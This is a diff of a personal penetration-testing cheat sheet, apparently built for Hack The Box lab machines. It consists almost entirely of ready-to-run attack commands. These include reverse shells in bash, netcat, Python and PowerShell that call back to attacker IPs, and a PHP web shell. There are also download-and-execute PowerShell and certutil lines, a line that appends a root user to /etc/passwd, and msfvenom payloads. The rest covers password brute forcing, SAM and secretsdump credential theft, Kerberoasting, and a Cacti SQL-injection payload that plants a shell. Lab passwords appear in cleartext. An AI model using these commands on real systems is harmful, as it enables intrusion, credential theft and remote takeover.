@@ -1,22 +1,64 @@
 USEFUL COMMANDS
+BOX=ip
+sudo nmap -sC -sV -oN AA.nmap AA.htb -v; sudo nmap -sS -sV -sC -T5 -p- -oN AA.full.nmap AA.htb -v
+gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -k -u 
+ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://knife.htb/ -H 'Host: FUZZ.schooled.htb' -fs 5815
+sudo !!
 stty raw -echo
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 python -c 'import pty;pty.spawn("/bin/bash")'
-gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -k -u
-gobuster dir --help
+gobuster dns -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -d schooled.htb
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+OR in grep: grep 'false\|nologin'
+to count lines: wc -l <filename>
+
+Workspace alttab = CTRL+ALT+arrow // move window to a workspace: CTRL+ALT+SHIFT+arrow
+
+LINUX LIST USERS
+cat /etc/passwd |grep -v 'nologin\|false'|cut -d ':' -f 1
+
+LINUX LOGS
+aureport --tty
+
+PYTHON2 TO PYTHON3 CONVERT
+2to3-2.7 -w 46635.py
+
+CTRL + Z
+stty raw -echo
+fg
+
+STUCK??
+nmap tcp? udp? -sS -Pn -p-? https on 80? http has php? CTRL+U? gobuster/dirbuster? subdoms/vhosts? hidden files? stego?
+versions? updatedb searchsploit? google dorks xploits? ~? dns axfr @ip ?
+
+DNS
+dig axfr @10.129.146.152 friendzone.red
+
 LINPEAS
-https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+IF NO WGET OR CURL: 
+Victim machine: nc -lvn 9898 > linpeas.sh 
+Attacking machine: cat linpeas.sh|nc monitors.htb 9898
+See output and write to a file at the same time:
+chmod +x linpeas.sh; ./linpeas.sh | tee output.txt
+
+WINPEAS
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
+./winPEASx64.exe | tee -filepath output.txt
 
 REV SHELLS
-0<&196;exec 196<>/dev/tcp/10.10.14.58/5555; sh <&196 >&196 2>&196
-rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.58 5555 > /tmp/f
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.58",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+bash -i >& /dev/tcp/10.10.14.98/5555 0>&1
+0<&196;exec 196<>/dev/tcp/10.10.14.98/5555; sh <&196 >&196 2>&196
+rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.98 5555 > /tmp/f
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.73",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
+open("/etc/passwd","a+").write("toor1:aaKNIEDOaueR6:0:0:toor:/root:/bin/bash")
 
 BRUTEFORCE
 hydra nineveh.htb -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"
 /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
+hashcat --example-hashes|grep -n3 md5
+hashcat -m 18200 -w 1 hash.txt /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
 
 BINWALK
 cd /tmp && git clone https://github.com/ReFirmLabs/binwalk && cd - && cd /tmp/binwalk && sudo ./setup.py install && cd -
@@ -24,21 +66,43 @@ cd /tmp && git clone https://github.com/ReFirmLabs/binwalk && cd - && cd /tmp/bi
 RBASH ESCAPE
 ssh <username>@<IP-Adress> -t "bash --noprofile"
 
-WINPEAS / WINDOWS
+WINPEAS /PSPY / WINDOWS /SUID SEARCH / EVILWINRM
 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+find / -type f -perm -4000 2>/dev/null
 wget http://blog.stackexchange.com/ -OutFile out.html
+//WORKED: certutil -urlcache -split -f http://10.10.14.85:7878/shell64.exe C:\\users\\public\\shell64.exe
+cmd /c powershell -c (New-Object System.Net.WebClient).DownloadString('http://10.10.14.85:7878/revshell.ps1') | powershell -noprofile -;
 powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c cd /d %CD% && %*'"
+powershell '(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.98:7878/priv.ps1","priv.ps1")'
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.98',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 powershell "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.58:8080/shell.exe','shell.exe')"
 powershell Invoke-WebRequest -Uri http://10.10.14.58/shell.exe -OutFile out.yml
 (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")
 Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip"
 C:\windows\syswow64\windowspowershell\v1.0\powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell 
-smbclient -N -L \\\\10.10.10.27\\
+sudo gem install evil-winrm
+
+WINDOWS CMD
+Recursive search: where /r c:\ user.txt
+
+WINDOWS EVIL-WINRM
+git clone https://github.com/Hackplayers/evil-winrm
+cd evil-winrm/
+cat Gemfile
+sudo gem install winrm winrm-fs stringio
+ruby evil-winrm.rb -i heist.htb -u Chase -p 'Q4)sJu\Y8qz*A3?d'
+
+KERBEROAST
+impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.129.152.219
 
 METASPLOIT HANDLER/PRIVESC
+ssh into suggester: scanner/ssh/ssh_login 
+msf> search type:exploit platform:windows target:2008 smb
+searchsploit microsoft smb
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.58 LPORT=6666 -f aspx -o revshell.aspx
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.58 LPORT=6666 -f exe > shell64.ex
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.58 LPORT=6666 -f exe > shell64.exe
 msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.14.98 LPORT=4444 -f elf > rev.elf
 use exploit/multi/handler
 UPGRADE: CTRL+Z, sessions -u 1
@@ -60,6 +124,7 @@ cat file.txt|xclip
 SSH
 ssh-keygen -f mykey
 cat mykey.pub # you can copy this to authorized_keys
+ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER
 
 rev shell php worked with ext .htb (see html comment), user flag readable as www-data:
 848b16799025a2a389f0ebe25d531be6
@@ -70,8 +135,47 @@ Copy to file login request from Burp name it "req"
 sqlmap -r req --risk=3 --level=3 --batch --force-ssl
 
 SMB
+smbclient -N -L \\\\10.10.10.27\\
+smbclient --no-pass -L //<IP> # Null user
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>
+smbmap -H <IP> [-P <PORT>] #Null user
+smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
+smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
+crackmapexec smb <IP> -u '' -p '' --shares #Null user
+crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
+crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
 smbmap -R FolderName -H 10.10.10.100 -A Filename.xml -q
 smbclient -L \\active.htb -U SVC_TGS
-smbclient //10.10.10.100/Replication
+smbclient -N //10.129.146.152/general
 recurse ON
 mget *
+C:\WIndows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+sudo apt install samdump2
+samdump2 -o out_file SYSTEM SAM
+msfconsole use winrm
+impacket-lookupids
+procdump https://download.sysinternals.com/files/Procdump.zip
+
+KERBEROASTING
+python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.145.201 -request
+python /usr/share/doc/python3-impacket/examples/wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.145.201
+
+BACKUP
+scp -r htb-lawinn@htb-uccb72lwbw.htb-cloud.com:/home/htb-lawinn/my_data G:\Pentest\HTB\my_data
+
+STEGO
+steghide extract -sf out.jpg
+
+SQL injection (SQLi)
+Rev shell
+GET /cacti/color.php?action=export&header=false&filter=1') UNION SELECT 1,username,password,4,5,6,7 from user_auth;update settings set value='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.85 5555 >/tmp/f;' where name='path_php_binary';-- - HTTP/1.1
+-> URL encode it
+
+MYSQL/SQL local
+mysql -u ona_sys -p
+show databases;
+use SuperDB;
+show tables;
+
+When doing sql queries, if you add \G to the end, it will show the fields in a vertical list which makes tables with a lot of fields sooo much easier to read.  e.g., SELECT * FROM users\G;
